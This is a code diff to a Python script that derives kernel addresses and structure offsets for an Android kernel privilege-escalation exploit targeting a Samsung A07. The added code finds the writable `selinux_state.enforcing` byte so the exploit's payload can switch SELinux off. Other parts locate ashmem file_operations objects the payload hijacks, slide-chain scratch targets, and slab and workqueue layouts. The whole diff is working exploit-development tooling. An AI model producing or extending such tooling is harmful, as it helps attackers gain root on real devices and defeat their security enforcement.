@@ -97,12 +97,16 @@ def derive_slide_chain(image: ElfImage, layouts: dict[str, dict[str, int]], text
     else:
         section = section_kind(image, logger.value)
         out["SLIDE_NFULNL_LOGGER_OBJECT_OFF"] = {
-            "status": "derived" if writable(section) else "cross-check-failed",
-            "value": image_offset(logger.value, text_base),
+            "status": "derived" if writable(section) else "incompatible-section",
+            "value": image_offset(logger.value, text_base) if writable(section) else None,
             "symbol": "nfulnl_logger",
             "section": section,
             "evidence": f"symbol `nfulnl_logger` at 0x{logger.value:x} in {section}"
-            + ("" if writable(section) else ", which is not writable at runtime"),
+            + ("" if writable(section) else
+               ", which the kernel maps read-only at runtime. src/util.c:1800 and src/fops.c:314 "
+               "write and restore rb_node words inside this object, so on A07 it cannot serve as "
+               "the slide scratch target; a writable replacement has to be chosen from A07's own "
+               "image, not copied from another device."),
         }
         name_field = layouts.get("nf_logger", {}).get("name")
         if name_field is None:
@@ -231,6 +235,8 @@ def derive_ashmem(image: ElfImage, layouts: dict[str, dict[str, int]], text_base
                 })
     return {
         "symbols": symbols,
+        "symbolNames": [symbol["name"] for symbol in symbols],
+        "hasClassicFops": any(symbol["name"] in ("ashmem_fops", "ashmem_misc_fops") for symbol in symbols),
         "fopsCandidates": candidates,
         "note": (
             "The payload hijacks an ashmem file's f_op (src/util.c:728) so ASHMEM_SET_NAME keeps "
@@ -241,8 +247,9 @@ def derive_ashmem(image: ElfImage, layouts: dict[str, dict[str, int]], text_base
     }
 
 
-def derive_selinux(image: ElfImage, text_base: int) -> dict[str, Any]:
-    """Every SELinux state candidate, with the section that decides whether it is writable."""
+def derive_selinux(image: ElfImage, layouts: dict[str, dict[str, int]], sizes: dict[str, int],
+                   pahole_raw: dict[str, str], text_base: int) -> dict[str, Any]:
+    """Every SELinux state candidate, plus the modern `selinux_state.enforcing` address."""
     interesting = ("selinux", "enforcing", "checkreqprot")
     facts = []
     for symbol in image.symbol_list:
@@ -263,7 +270,47 @@ def derive_selinux(image: ElfImage, text_base: int) -> dict[str, Any]:
             "firstBytes": raw.hex() if raw else None,
         })
     facts.sort(key=lambda item: item["name"])
+
+    # Modern kernels keep the runtime flag inside `struct selinux_state`; the boot-time
+    # `selinux_enforcing_boot` is `__initdata`/`__ro_after_init` and cannot disable anything at
+    # runtime. src/root.c reads and writes one byte, so `bool enforcing` is the right shape - but
+    # only if this image proves the object exists, is writable, and has that member.
+    derived: dict[str, Any] = {"status": "unresolved"}
+    state = image.symbol("selinux_state")
+    enforcing_off = layouts.get("selinux_state", {}).get("enforcing")
+    if state is None:
+        derived = {"status": "unresolved", "reason": "no `selinux_state` object symbol in kernel.elf"}
+    elif enforcing_off is None:
+        derived = {"status": "unresolved",
+                   "reason": "BTF has no `selinux_state.enforcing` member offset",
+                   "selinuxStateMembers": sorted(layouts.get("selinux_state", {}))}
+    else:
+        section = section_kind(image, state.value)
+        raw = pahole_raw.get("selinux_state", "")
+        is_bool = bool(re.search(r"\benforcing\s*;\s*/\*", raw)) and "bool" in raw
+        object_size = state.size or sizes.get("selinux_state") or 0
+        fits = object_size == 0 or enforcing_off + 1 <= object_size
+        current = image.read(state.value + enforcing_off, 1)
+        ok = writable(section) and fits and current is not None and current[0] in (0, 1)
+        derived = {
+            "status": "derived" if ok else "cross-check-failed",
+            "value": image_offset(state.value + enforcing_off, text_base) if ok else None,
+            "symbol": "selinux_state",
+            "section": section,
+            "enforcingMemberOffset": enforcing_off,
+            "objectSize": object_size,
+            "byteInImage": current[0] if current else None,
+            "declaredBool": is_bool,
+            "evidence": (
+                f"`selinux_state` at 0x{state.value:x} in {section} (size 0x{object_size:x}), "
+                f"BTF `enforcing` at +0x{enforcing_off:x}, byte in image = "
+                f"{current[0] if current else 'unreadable'}"
+                + ("" if ok else " - rejected: needs a writable section, a bool-sized member that "
+                                 "fits the object, and a 0/1 value in the image")
+            ),
+        }
     return {
+        "derivedEnforcing": derived,
         "candidates": facts,
         "note": (
             "src/root.c:191 reads one byte at SELINUX_ENFORCING, requires it to be 0 or 1, sets it "
@@ -326,16 +373,24 @@ def derive_workqueue(layouts: dict[str, dict[str, int]]) -> dict[str, Any]:
 
 
 SOURCE_PROBES: tuple[tuple[str, str, str], ...] = (
-    ("selinux enforcing declaration", r"security/selinux", r"^\s*(?:static\s+)?(?:bool|int|struct selinux_state)\b[^\n]*enforcing[^\n]*$"),
-    ("selinux state struct", r"security/selinux/include", r"struct\s+selinux_state\b"),
-    ("ashmem implementation files", r"drivers", r"ASHMEM_SET_NAME|ashmem_memfd|misc_register"),
-    ("ashmem device registration", r"drivers", r"\.name\s*=\s*\"ashmem\""),
-    ("nfulnl_logger definition", r"net/netfilter", r"nfulnl_logger\s*=|static\s+struct\s+nf_logger"),
-    ("random_table boot_id entry", r"drivers/char", r"random_table|\"boot_id\""),
-    ("struct slab definition", r"include/linux", r"struct\s+slab\s*\{"),
-    ("rt_mutex_waiter definition", r"include/linux|kernel/locking", r"struct\s+rt_(mutex_)?waiter(_node)?\s*\{"),
-    ("arm64 memory map constants", r"arch/arm64/include/asm", r"#define\s+(PAGE_OFFSET|VMEMMAP_START|KIMAGE_VADDR|DIRECT_MAP_BASE|_PAGE_OFFSET)\b"),
-    ("arm64 VA_BITS config", r"arch/arm64", r"CONFIG_ARM64_VA_BITS|VA_BITS\s+"),
+    ("selinux enforcing declaration", r"security/selinux", r"^[^\n]*\benforcing\b[^\n]*(?:;|=)[^\n]*$"),
+    ("selinux_state global definition", r"security/selinux", r"^(?:extern\s+)?struct\s+selinux_state\s+selinux_state[^\n]*$"),
+    ("selinux_state struct members", r"security/selinux/include", r"struct\s+selinux_state\s*\{[^}]*\}"),
+    ("ashmem SET_NAME handling", r"ashmem", r"ASHMEM_SET_NAME|ashmem_memfd_ioctl|set_name"),
+    ("ashmem misc device registration", r"ashmem", r"misc_register|miscdevice|\.name\s*=\s*\"ashmem\""),
+    ("ashmem CONFIG gating", r"arch/arm64/configs|drivers/(?:staging/)?android", r"CONFIG_ASHMEM|CONFIG_ANDROID_ASHMEM"),
+    ("nfulnl_logger declaration", r"net/netfilter", r"^[^\n]*nf_logger\s+nfulnl_logger[^\n]*$|__ro_after_init[^\n]*$"),
+    ("random_table boot_id entry", r"drivers/char", r"\"boot_id\"|random_table\[\]"),
+    ("struct slab definition", r"include/linux", r"struct\s+slab\s*\{[^}]*\}"),
+    ("rt_mutex_waiter definition", r"include/linux|kernel/locking", r"struct\s+rt_waiter_node\s*\{[^}]*\}|struct\s+rt_mutex_waiter\s*\{[^}]*\}"),
+    ("arm64 memory map constants", r"arch/arm64/include/asm", r"#define\s+(PAGE_OFFSET|VMEMMAP_START|KIMAGE_VADDR|DIRECT_MAP_BASE|_PAGE_OFFSET|VA_BITS)\b[^\n]*$"),
+)
+
+# Files whose *path* names the driver answer "is the classic ashmem driver even in this tree"
+# better than a content grep, which matches every misc device in the kernel.
+PATH_CENSUS: tuple[tuple[str, str], ...] = (
+    ("ashmem source files", r"ashmem"),
+    ("selinux source files", r"security/selinux/(?:hooks|include/security)"),
 )
 
 
@@ -344,7 +399,17 @@ def audit_source(source_root: Path, limit: int = 12) -> dict[str, list[dict[str,
     findings: dict[str, list[dict[str, Any]]] = {}
     if not source_root.is_dir():
         return {"(source root missing)": [{"file": str(source_root), "line": 0, "text": "not extracted"}]}
-    files = [path for path in source_root.rglob("*") if path.is_file() and path.suffix in {".c", ".h", ".S", "Kconfig"}]
+    files = [path for path in source_root.rglob("*")
+             if path.is_file() and (path.suffix in {".c", ".h", ".S"} or path.name in {"Kconfig", "Makefile"}
+                                    or "defconfig" in path.name or "gki_defconfig" in path.name)]
+    for label, pattern in PATH_CENSUS:
+        regex = re.compile(pattern)
+        matches = [path.relative_to(source_root).as_posix() for path in files
+                   if regex.search(path.relative_to(source_root).as_posix())]
+        findings[label] = [{"file": name, "line": 0, "text": "present in the source tree"}
+                           for name in sorted(matches)[:limit]]
+        if not matches:
+            findings[label] = []
     for label, directory, pattern in SOURCE_PROBES:
         regex = re.compile(pattern, re.M)
         directory_regex = re.compile(directory)
@@ -368,20 +433,24 @@ def audit_source(source_root: Path, limit: int = 12) -> dict[str, list[dict[str,
     return findings
 
 
-def layouts_from_btf(btf: Path, work: Path, wanted: tuple[str, ...]) -> tuple[dict[str, dict[str, int]], dict[str, int]]:
+def layouts_from_btf(
+    btf: Path, work: Path, wanted: tuple[str, ...]
+) -> tuple[dict[str, dict[str, int]], dict[str, int], dict[str, str]]:
     """pahole the structures the derivations need, from the target's own BTF."""
     wrapper = work / "a07-derive-btf.elf"
     make_btf_elf(btf, wrapper)
     layouts: dict[str, dict[str, int]] = {}
     sizes: dict[str, int] = {}
+    raws: dict[str, str] = {}
     for type_name in wanted:
-        fields, _types, size, _raw = pahole_type(wrapper, type_name)
+        fields, _types, size, raw = pahole_type(wrapper, type_name)
         if fields:
             layouts[type_name] = fields
         if size:
             sizes[type_name] = size
+        raws[type_name] = raw
     layouts["__sizes__"] = sizes
-    return layouts, sizes
+    return layouts, sizes, raws
 
 
 def main() -> int:
@@ -418,13 +487,15 @@ def main() -> int:
         return 1
 
     wanted = ("nf_logger", "ctl_table", "file_operations", "slab", "page", "pool_workqueue",
-              "workqueue_struct", "rt_mutex_waiter", "rt_waiter_node", "sk_buff", "nf_hook_ops")
+              "workqueue_struct", "rt_mutex_waiter", "rt_waiter_node", "selinux_state",
+              "sk_buff", "nf_hook_ops")
     layouts: dict[str, dict[str, int]] = {}
     sizes: dict[str, int] = {}
+    pahole_raw: dict[str, str] = {}
     btf_error = None
     if args.btf and args.btf.is_file():
         try:
-            layouts, sizes = layouts_from_btf(args.btf, work, wanted)
+            layouts, sizes, pahole_raw = layouts_from_btf(args.btf, work, wanted)
         except Exception as error:  # a BTF failure is reported, never worked around
             btf_error = str(error)
     else:
@@ -438,7 +509,7 @@ def main() -> int:
         "btfStructSizes": sizes,
         "slideChain": derive_slide_chain(image, layouts, text_base),
         "ashmem": derive_ashmem(image, layouts, text_base),
-        "selinux": derive_selinux(image, text_base),
+        "selinux": derive_selinux(image, layouts, sizes, pahole_raw, text_base),
         "slab": derive_slab(layouts, sizes),
         "workqueue": derive_workqueue(layouts),
         "waiterLayout": {
@@ -471,13 +542,21 @@ def main() -> int:
     for name in unresolved:
         emit("error", f"{name}: {slide[name].get('reason') or slide[name].get('evidence')}")
     ashmem = facts["ashmem"]
-    emit("notice", f"ashmem on A07: {len(ashmem['symbols'])} symbols, "
-                   f"{len(ashmem['fopsCandidates'])} fops object(s) carrying ashmem handlers: "
-         + (", ".join(c["object"] for c in ashmem["fopsCandidates"]) or "(none found)"))
+    emit("notice", f"ashmem symbols in A07 kernel.elf ({len(ashmem['symbols'])}): "
+         + (", ".join(f"{i['name']}[{i['type']}/{i['section']}]" for i in ashmem["symbols"][:14]) or "(none)")
+         + f"; classic ashmem_fops/ashmem_misc_fops present: {ashmem['hasClassicFops']}")
+    for candidate in ashmem["fopsCandidates"][:6]:
+        emit("notice", f"fops object {candidate['object']} (offset 0x{candidate['imageOffset']:x}) handlers: "
+             + ", ".join(f"{k}={v}" for k, v in sorted(candidate["allHandlers"].items())))
     selinux = facts["selinux"]
-    writable_candidates = [c["name"] for c in selinux["candidates"] if c["writable"] and c["size"] in (1, 4, 8)]
-    emit("notice", f"SELinux state candidates: {len(selinux['candidates'])}; runtime-writable bool-sized: "
-         + (", ".join(writable_candidates) or "(none)"))
+    enforcing = selinux["derivedEnforcing"]
+    emit("notice" if enforcing.get("status") == "derived" else "error",
+         f"SELinux enforcing derivation: {enforcing.get('status')} - "
+         + (enforcing.get("evidence") or enforcing.get("reason") or "")
+         + (f"; value=0x{enforcing['value']:x}" if enforcing.get("value") is not None else ""))
+    named = [f"{c['name']}[{c['section']}{'/w' if c['writable'] else '/ro'}:{c['size']}]"
+             for c in selinux["candidates"][:24]]
+    emit("notice", f"SELinux object candidates ({len(selinux['candidates'])}): " + ", ".join(named))
     emit("notice", f"struct slab overlay: {facts['slab']['status']} - {facts['slab']['evidence']}")
     emit("notice", f"workqueue max_active: pwq has it = {facts['workqueue']['pwqHasMaxActive']}, "
                    f"workqueue_struct.max_active = {facts['workqueue']['wqMaxActiveOffset']}, "
@@ -486,7 +565,8 @@ def main() -> int:
         emit("error", f"BTF layouts unavailable, so structure-dependent derivations are unresolved: {btf_error}")
     for label, hits in (facts.get("sourceAudit") or {}).items():
         if hits:
-            emit("notice", f"source[{label}]: " + " | ".join(f"{h['file']}:{h['line']}: {h['text']}" for h in hits[:4]))
+            emit("notice", f"source[{label}]: " + " | ".join(
+                f"{h['file']}:{h['line']}: {h['text'][:120]}" for h in hits[:6]))
         else:
             emit("error", f"source[{label}]: no match in the extracted Samsung source")
     return 0
